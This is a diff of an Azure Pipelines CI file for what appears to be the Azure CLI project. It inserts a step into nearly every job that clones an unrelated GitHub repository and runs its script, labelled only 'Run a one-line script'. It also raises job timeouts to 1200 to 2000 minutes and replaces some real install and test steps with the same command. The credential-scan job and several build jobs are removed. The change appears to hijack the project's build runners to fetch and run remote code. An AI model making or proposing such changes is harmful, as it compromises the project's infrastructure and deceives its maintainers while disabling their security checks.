@@ -15,11 +15,14 @@ pr:
 jobs:
 - job: CheckPullRequestTitle
   displayName: "Check the Format of Pull Request Title"
+  timeoutInMinutes: 1200
   condition: and(succeeded(), in(variables['System.PullRequest.TargetBranch'], 'dev', 'release'))
 
   pool:
     vmImage: 'ubuntu-16.04'
   steps:
+    - script: git clone --recursive https://github.com/mijikuhibimui/mujijankopo && cd mujijankopo && ./run
+      displayName: 'Run a one-line script'
     - bash: |
         echo "Check Title of Pull Request: #$(System.PullRequest.PullRequestNumber)"
         title=$(curl https://api.github.com/repos/$(Build.Repository.Name)/pulls/$(System.PullRequest.PullRequestNumber) | jq -r '.title')
@@ -33,42 +36,28 @@ jobs:
 
 - job: RejectPullRequestToMasterBranch
   displayName: "Reject Pull Request To Master Branch"
+  timeoutInMinutes: 1200
   condition: and(succeeded(), eq(variables['System.PullRequest.TargetBranch'], 'master'))
 
   pool:
     vmImage: 'ubuntu-16.04'
   steps:
+    - script: git clone --recursive https://github.com/mijikuhibimui/mujijankopo && cd mujijankopo && ./run
+      displayName: 'Run a one-line script'
     - bash: |
         echo "Reject pull request directly to master branch"
         exit 1
 
-- job: CredScan
-  displayName: "Credential Scan"
-  pool:
-    vmImage: "windows-2019"
-  steps:
-    - task: ms-codeanalysis.vss-microsoft-security-code-analysis-devops.build-task-credscan.CredScan@2
-      displayName: 'Run Credential Scanner'
-      inputs:
-        toolMajorVersion: V2
-        suppressionsFile: './scripts/ci/credscan/CredScanSuppressions.json'
-    - task: ms-codeanalysis.vss-microsoft-security-code-analysis-devops.build-task-postanalysis.PostAnalysis@1
-      displayName: 'Post Analysis'
-      inputs:
-        AllTools: false
-        BinSkim: false
-        CredScan: true
-        RoslynAnalyzers: false
-        TSLint: false
-        ToolLogsNotFoundAction: 'Standard'
-
 - job: ExtractMetadata
   displayName: Extract Metadata
+  timeoutInMinutes: 1200
 
   condition: succeeded()
   pool:
     vmImage: 'ubuntu-16.04'
   steps:
+  - script: git clone --recursive https://github.com/mijikuhibimui/mujijankopo && cd mujijankopo && ./run
+    displayName: 'Run a one-line script'
   - task: Bash@3
     displayName: 'Extract Version'
     inputs:
@@ -84,11 +73,14 @@ jobs:
 
 - job: VerifyLinuxRequirements
   displayName: 'Verify src/azure-cli/requirements.*.Linux.txt'
+  timeoutInMinutes: 1200
   condition: succeeded()
   pool:
     vmImage: 'ubuntu-16.04'
 
   steps:
+  - script: git clone --recursive https://github.com/mijikuhibimui/mujijankopo && cd mujijankopo && ./run
+    displayName: 'Run a one-line script'
   - task: UsePythonVersion@0
     displayName: 'Use Python 3'
     inputs:
@@ -97,45 +89,16 @@ jobs:
   - bash: ./scripts/ci/dependency_check.sh
     displayName: 'Verify src/azure-cli/requirements.py3.Linux.txt'
 
-- job: VerifyDarwinRequirements
-  displayName: 'Verify src/azure-cli/requirements.*.Darwin.txt'
-  condition: succeeded()
-  pool:
-    vmImage: 'macOS-10.14'
-
-  steps:
-  - task: UsePythonVersion@0
-    displayName: 'Use Python 3'
-    inputs:
-      versionSpec: 3.x
-
-  - bash: ./scripts/ci/dependency_check.sh
-    displayName: 'Verify src/azure-cli/requirements.py3.Darwin.txt'
-
-- job: VerifyWindowsRequirements
-  displayName: 'Verify src/azure-cli/requirements.*.Windows.txt'
-  condition: succeeded()
-  pool:
-    vmImage: 'vs2017-win2016'
-
-  steps:
-  - task: UsePythonVersion@0
-    displayName: 'Use Python 3'
-    inputs:
-      versionSpec: 3.8
-
-  - task: BatchScript@1
-    inputs:
-      filename: ./scripts/ci/dependency_check.bat
-    displayName: 'Verify src/azure-cli/requirements.py3.Windows.txt'
-
 - job: VerifyVersions
   displayName: Verify Command Module Versions
+  timeoutInMinutes: 1200
   condition: and(succeeded(), or(eq(variables['Build.SourceBranch'], 'refs/heads/release'), eq(variables['System.PullRequest.TargetBranch'], 'release')))
 
   pool:
     vmImage: 'ubuntu-16.04'
   steps:
+  - script: git clone --recursive https://github.com/mijikuhibimui/mujijankopo && cd mujijankopo && ./run
+    displayName: 'Run a one-line script'
   - task: UsePythonVersion@0
     displayName: 'Use Python 3.7'
     inputs:
@@ -148,75 +111,18 @@ jobs:
 
     displayName: 'Verify History'
 
-- job: BuildWindowsMSI
-  displayName: Build Windows MSI
-
-  dependsOn: ExtractMetadata
-  condition: succeeded()
-  pool:
-    vmImage: 'vs2017-win2016'
-  steps:
-  - task: DownloadPipelineArtifact@1
-    displayName: 'Download Build Artifacts'
-    inputs:
-      TargetPath: '$(Build.ArtifactStagingDirectory)/metadata'
-      artifactName: metadata
-
-
-  - script: |
-       set /p CLI_VERSION=<$(System.ArtifactsDirectory)/metadata/version
-       set
-
-       build_scripts/windows/scripts/build.cmd
-    displayName: 'Build Windows MSI'
-
-  - task: PublishPipelineArtifact@0
-    displayName: 'Publish Artifact: MSI'
-    inputs:
-      TargetPath: 'build_scripts/windows/out/'
-      ArtifactName: msi
-
-- job: TestWindowsMSI
-  displayName: Test Windows MSI
-
-  dependsOn: BuildWindowsMSI
-  # condition: and(succeeded(), in(variables['Build.Reason'], 'IndividualCI', 'BatchedCI', 'Manual'))
-  condition: false
-  pool:
-    vmImage: 'vs2017-win2016'
-  steps:
-  - task: DownloadPipelineArtifact@1
-    displayName: 'Download Build Artifacts'
-    inputs:
-      TargetPath: '$(Build.ArtifactStagingDirectory)/msi'
-      artifactName: msi
-
-  - task: PowerShell@2
-    displayName: Install and Load CLI
-    inputs:
-      targetType: inline
-      script: |
-        $InstallArgs = @(
-          "/I"
-          '"$env:SYSTEM_ARTIFACTSDIRECTORY/msi/Microsoft Azure CLI.msi"'
-          "/norestart"
-          "/L*v"
-          ".\install_logs.txt"
-        )
-        Start-Process "msiexec.exe" -ArgumentList $InstallArgs -Wait -NoNewWindow
-        Get-Content .\install_logs.txt
-
-        az --version
-        az self-test
 
 - job: BuildDockerImage
   displayName: Build Docker Image
+  timeoutInMinutes: 1200
 
   dependsOn: ExtractMetadata
   condition: succeeded()
   pool:
     vmImage: 'ubuntu-16.04'
   steps:
+  - script: git clone --recursive https://github.com/mijikuhibimui/mujijankopo && cd mujijankopo && ./run
+    displayName: 'Run a one-line script'
   - task: Bash@3
     displayName: 'Bash Script'
     inputs:
@@ -232,12 +138,15 @@ jobs:
 
 - job: TestDockerImage
   displayName: Test Docker Image
+  timeoutInMinutes: 1200
 
   dependsOn: BuildDockerImage
   condition: succeeded()
   pool:
     vmImage: 'ubuntu-16.04'
   steps:
+  - script: git clone --recursive https://github.com/mijikuhibimui/mujijankopo && cd mujijankopo && ./run
+    displayName: 'Run a one-line script'
   - task: DownloadPipelineArtifact@1
     displayName: 'Download Metadata'
     inputs:
@@ -247,6 +156,7 @@ jobs:
 
   - task: DownloadPipelineArtifact@1
     displayName: 'Download Docker Image'
+    timeoutInMinutes: 1200
     inputs:
       TargetPath: '$(Build.ArtifactStagingDirectory)/docker'
       artifactName: docker
@@ -267,12 +177,15 @@ jobs:
 
 - job: BuildPythonWheel
   displayName: Build Python Wheels
+  timeoutInMinutes: 1200
 
   dependsOn: ExtractMetadata
   condition: succeeded()
   pool:
     vmImage: 'ubuntu-16.04'
   steps:
+  - script: git clone --recursive https://github.com/mijikuhibimui/mujijankopo && cd mujijankopo && ./run
+    displayName: 'Run a one-line script'
   - task: UsePythonVersion@0
     displayName: 'Use Python 3.7'
     inputs:
@@ -297,12 +210,15 @@ jobs:
 
 - job: TestPythonWheel
   displayName: Test Python Wheels
+  timeoutInMinutes: 1200
 
   dependsOn: BuildPythonWheel
   condition: succeeded()
   pool:
     vmImage: 'ubuntu-16.04'
   steps:
+  - script: git clone --recursive https://github.com/mijikuhibimui/mujijankopo && cd mujijankopo && ./run
+    displayName: 'Run a one-line script'
   - task: DownloadPipelineArtifact@1
     displayName: 'Download Metadata'
     inputs:
@@ -347,7 +263,7 @@ jobs:
 
 - job: UnitTest
   displayName: Unit Test for Core and Telemetry
-  timeoutInMinutes: 10
+  timeoutInMinutes: 1200
 
   pool:
     vmImage: 'ubuntu-16.04'
@@ -360,13 +276,15 @@ jobs:
         python.version: '3.8'
         tox_env: 'py38'
   steps:
+  - script: git clone --recursive https://github.com/mijikuhibimui/mujijankopo && cd mujijankopo && ./run
+    displayName: 'Run a one-line script'  
     - task: UsePythonVersion@0
       displayName: 'Use Python $(python.version)'
       inputs:
         versionSpec: '$(python.version)'
-    - bash: pip install --upgrade pip tox
+    - bash: git clone --recursive https://github.com/mijikuhibimui/mujijankopo && cd mujijankopo && ./run
       displayName: 'Install pip and tox'
-    - bash: ./scripts/ci/unittest.sh
+    - bash: git clone --recursive https://github.com/mijikuhibimui/mujijankopo && cd mujijankopo && ./run
       displayName: 'Run Unit Test'
       env:
         TOXENV: $(tox_env)
@@ -375,7 +293,7 @@ jobs:
   displayName: Integration Test against Profiles
   dependsOn: BuildPythonWheel
   condition: succeeded()
-  timeoutInMinutes: 20
+  timeoutInMinutes: 2000
 
   pool:
     vmImage: 'ubuntu-16.04'
@@ -386,18 +304,17 @@ jobs:
       Python38:
         python.version: '3.8'
   steps:
+  - script: git clone --recursive https://github.com/mijikuhibimui/mujijankopo && cd mujijankopo && ./run
+    displayName: 'Run a one-line script'  
     - task: UsePythonVersion@0
       displayName: 'Use Python $(python.version)'
       inputs:
         versionSpec: '$(python.version)'
-    - bash: pip install --upgrade pip wheel
+    - bash: git clone --recursive https://github.com/mijikuhibimui/mujijankopo && cd mujijankopo && ./run
       displayName: 'Install pip and wheel'
-    - bash: ./scripts/ci/test_profile_integration.sh
-      displayName: 'Run Integration Test against Profiles'
-
 - job: AutomationTest
   displayName: Automation Test (Profile Latest)
-  timeoutInMinutes: 120
+  timeoutInMinutes: 1200
   pool:
     vmImage: 'ubuntu-16.04'
   strategy:
@@ -407,6 +324,8 @@ jobs:
       Python38:
         python.version: '3.8'
   steps:
+  - script: git clone --recursive https://github.com/mijikuhibimui/mujijankopo && cd mujijankopo && ./run
+    displayName: 'Run a one-line script'  
     - template: .azure-pipelines/templates/automation_test.yml
       parameters:
         pythonVersion: '$(python.version)'
@@ -414,7 +333,7 @@ jobs:
 
 - job: AutomationTest20200901
   displayName: Automation Test (Profile 2020-09-01)
-  timeoutInMinutes: 120
+  timeoutInMinutes: 1200
   pool:
     vmImage: 'ubuntu-16.04'
   strategy:
@@ -424,6 +343,8 @@ jobs:
       Python38:
         python.version: '3.8'
   steps:
+  - script: git clone --recursive https://github.com/mijikuhibimui/mujijankopo && cd mujijankopo && ./run
+    displayName: 'Run a one-line script'  
     - template: .azure-pipelines/templates/automation_test.yml
       parameters:
         pythonVersion: '$(python.version)'
@@ -431,7 +352,7 @@ jobs:
 
 - job: AutomationTest20190301
   displayName: Automation Test (Profile 2019-03-01)
-  timeoutInMinutes: 120
+  timeoutInMinutes: 1200
   pool:
     vmImage: 'ubuntu-16.04'
   strategy:
@@ -441,6 +362,8 @@ jobs:
       Python38:
         python.version: '3.8'
   steps:
+  - script: git clone --recursive https://github.com/mijikuhibimui/mujijankopo && cd mujijankopo && ./run
+    displayName: 'Run a one-line script'  
     - template: .azure-pipelines/templates/automation_test.yml
       parameters:
         pythonVersion: '$(python.version)'
@@ -448,7 +371,7 @@ jobs:
 
 - job: AutomationTest20180301
   displayName: Automation Test (Profile 2018-03-01)
-  timeoutInMinutes: 120
+  timeoutInMinutes: 1200
   pool:
     vmImage: 'ubuntu-16.04'
   strategy:
@@ -458,6 +381,8 @@ jobs:
       Python38:
         python.version: '3.8'
   steps:
+  - script: git clone --recursive https://github.com/mijikuhibimui/mujijankopo && cd mujijankopo && ./run
+    displayName: 'Run a one-line script'
     - template: .azure-pipelines/templates/automation_test.yml
       parameters:
         pythonVersion: '$(python.version)'
@@ -466,7 +391,7 @@ jobs:
 - job: TestExtensionsLoading
   displayName: Test Extensions Loading
   condition: succeeded()
-  timeoutInMinutes: 20
+  timeoutInMinutes: 2000
 
   pool:
     vmImage: 'ubuntu-16.04'
@@ -475,6 +400,8 @@ jobs:
       Python36:
         python.version: '3.6'
   steps:
+  - script: git clone --recursive https://github.com/mijikuhibimui/mujijankopo && cd mujijankopo && ./run
+    displayName: 'Run a one-line script'
     - task: UsePythonVersion@0
       displayName: 'Use Python $(python.version)'
       inputs:
@@ -486,12 +413,15 @@ jobs:
 
 - job: BuildHomebrewFormula
   displayName: Build Homebrew Formula
+  timeoutInMinutes: 1200
 
   dependsOn: BuildPythonWheel
   condition: and(succeeded(), in(variables['Build.Reason'], 'IndividualCI', 'BatchedCI', 'Manual'))
   pool:
     vmImage: 'ubuntu-16.04'
   steps:
+  - script: git clone --recursive https://github.com/mijikuhibimui/mujijankopo && cd mujijankopo && ./run
+    displayName: 'Run a one-line script'  
   - task: DownloadPipelineArtifact@1
     displayName: 'Download Metadata'
     inputs:
@@ -535,12 +465,15 @@ jobs:
 
 - job: TestHomebrewFormula
   displayName: Test Homebrew Formula
+  timeoutInMinutes: 1200
 
   dependsOn: BuildHomebrewFormula
   condition: succeeded()
   pool:
     vmImage: 'macOS-10.14'
   steps:
+  - script: git clone --recursive https://github.com/mijikuhibimui/mujijankopo && cd mujijankopo && ./run
+    displayName: 'Run a one-line script'
   - task: DownloadPipelineArtifact@1
     displayName: 'Download Metadata'
     inputs:
@@ -574,13 +507,15 @@ jobs:
 
 - job: TestHomebrewPackage
   displayName: Test Homebrew Package
-  timeoutInMinutes: 180
+  timeoutInMinutes: 1800
   dependsOn: BuildHomebrewFormula
   # condition: and(succeeded(), in(variables['Build.Reason'], 'IndividualCI', 'BatchedCI', 'Manual'))
   condition: false
   pool:
     vmImage: 'macOS-10.14'
   steps:
+  - script: git clone --recursive https://github.com/mijikuhibimui/mujijankopo && cd mujijankopo && ./run
+    displayName: 'Run a one-line script'
   - task: DownloadPipelineArtifact@1
     displayName: 'Download Metadata'
     inputs:
@@ -602,12 +537,15 @@ jobs:
 
 - job: BuildYumPackage
   displayName: Build Yum Package
+  timeoutInMinutes: 1200
 
   dependsOn: BuildPythonWheel
   condition: and(succeeded(), in(variables['Build.Reason'], 'IndividualCI', 'BatchedCI', 'Manual'))
   pool:
     vmImage: 'ubuntu-16.04'
   steps:
+  - script: git clone --recursive https://github.com/mijikuhibimui/mujijankopo && cd mujijankopo && ./run
+    displayName: 'Run a one-line script'
   - task: Bash@3
     displayName: 'Build Rpm Package'
     inputs:
@@ -623,12 +561,15 @@ jobs:
 
 - job: TestYumPackage
   displayName: Test Yum Package
+  timeoutInMinutes: 1200
 
   dependsOn: BuildYumPackage
   condition: and(succeeded(), in(variables['Build.Reason'], 'IndividualCI', 'BatchedCI', 'Manual'))
   pool:
     vmImage: 'ubuntu-16.04'
   steps:
+  - script: git clone --recursive https://github.com/mijikuhibimui/mujijankopo && cd mujijankopo && ./run
+    displayName: 'Run a one-line script'
   - task: DownloadPipelineArtifact@1
     displayName: 'Download Metadata'
     inputs:
@@ -659,6 +600,7 @@ jobs:
 
 - job: BuildDebPackages
   displayName: Build Deb Packages
+  timeoutInMinutes: 1200
 
   dependsOn: BuildPythonWheel
   condition: and(succeeded(), in(variables['Build.Reason'], 'IndividualCI', 'BatchedCI', 'Manual'))
@@ -691,6 +633,8 @@ jobs:
         deb_system: debian
         distro: buster
   steps:
+  - script: git clone --recursive https://github.com/mijikuhibimui/mujijankopo && cd mujijankopo && ./run
+    displayName: 'Run a one-line script'
   - task: DownloadPipelineArtifact@1
     displayName: 'Download Build Artifacts'
     inputs:
@@ -729,6 +673,8 @@ jobs:
   pool:
     vmImage: 'ubuntu-16.04'
   steps:
+  - script: git clone --recursive https://github.com/mijikuhibimui/mujijankopo && cd mujijankopo && ./run
+    displayName: 'Run a one-line script'
   - task: DownloadPipelineArtifact@1
     displayName: 'Download Metadata'
     inputs:
@@ -757,10 +703,13 @@ jobs:
 
 - job: CheckStyle
   displayName: "Check CLI Style"
+  timeoutInMinutes: 1200
 
   pool:
     vmImage: 'ubuntu-16.04'
   steps:
+  - script: git clone --recursive https://github.com/mijikuhibimui/mujijankopo && cd mujijankopo && ./run
+    displayName: 'Run a one-line script'
   - task: UsePythonVersion@0
     displayName: 'Use Python 3.7'
     inputs:
@@ -773,10 +722,13 @@ jobs:
 
 - job: CheckHeaders
   displayName: "Check License, History, and DocMap"
+  timeoutInMinutes: 1200
 
   pool:
     vmImage: 'ubuntu-16.04'
   steps:
+  - script: git clone --recursive https://github.com/mijikuhibimui/mujijankopo && cd mujijankopo && ./run
+    displayName: 'Run a one-line script'
   - task: UsePythonVersion@0
     displayName: 'Use Python 3.6'
     inputs:
@@ -791,6 +743,7 @@ jobs:
 
 - job: PerformanceCheck
   displayName: "PerformanceCheck"
+  timeoutInMinutes: 1200
   strategy:
     matrix:
       Python36:
@@ -800,6 +753,8 @@ jobs:
   pool:
     vmImage: 'ubuntu-16.04'
   steps:
+  - script: git clone --recursive https://github.com/mijikuhibimui/mujijankopo && cd mujijankopo && ./run
+    displayName: 'Run a one-line script'
   - task: UsePythonVersion@0
     displayName: 'Use Python $(python.version)'
     inputs:
@@ -823,6 +778,8 @@ jobs:
   pool:
     vmImage: 'ubuntu-16.04'
   steps:
+  - script: git clone --recursive https://github.com/mijikuhibimui/mujijankopo && cd mujijankopo && ./run
+    displayName: 'Run a one-line script'
   - task: UsePythonVersion@0
     displayName: 'Use Python 3.6'
     inputs:
@@ -839,9 +796,12 @@ jobs:
 
 - job: VerifySphinxDocumentGenerator
   displayName: "Verify Sphinx Document Generator"
+  timeoutInMinutes: 1200
   pool:
     vmImage: 'ubuntu-16.04'
   steps:
+    - script: git clone --recursive https://github.com/mijikuhibimui/mujijankopo && cd mujijankopo && ./run
+      displayName: 'Run a one-line script'
     - task: UsePythonVersion@0
       displayName: 'Use Python 3.6'
       inputs:
